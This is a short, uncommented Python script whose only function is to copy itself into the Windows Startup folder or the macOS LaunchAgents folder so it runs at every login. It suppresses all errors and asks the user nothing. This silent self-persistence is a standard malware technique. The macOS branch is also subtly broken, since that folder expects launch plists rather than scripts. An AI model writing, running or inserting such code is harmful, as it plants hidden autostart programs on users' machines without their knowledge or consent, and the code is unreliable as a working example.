import os
import shutil
import sys
import subprocess

def add_to_startup(file_path):
    if sys.platform.startswith('win'):
        startup_folder = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
    elif sys.platform.startswith('darwin'):
        startup_folder = os.path.join(os.getenv('HOME'), 'Library', 'LaunchAgents')
    else:
        return
    
    try:
        shutil.copy(file_path, startup_folder)
    except Exception as e:
        pass

def main():
    file_path = os.path.abspath(__file__)
    
    if sys.platform.startswith('win'):
        startup_folder = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
        if not os.path.isfile(os.path.join(startup_folder, os.path.basename(file_path))):
            add_to_startup(file_path)
    elif sys.platform.startswith('darwin'):
        startup_folder = os.path.join(os.getenv('HOME'), 'Library', 'LaunchAgents')
        if not os.path.isfile(os.path.join(startup_folder, os.path.basename(file_path))):
            add_to_startup(file_path)

if __name__ == "__main__":
    main()
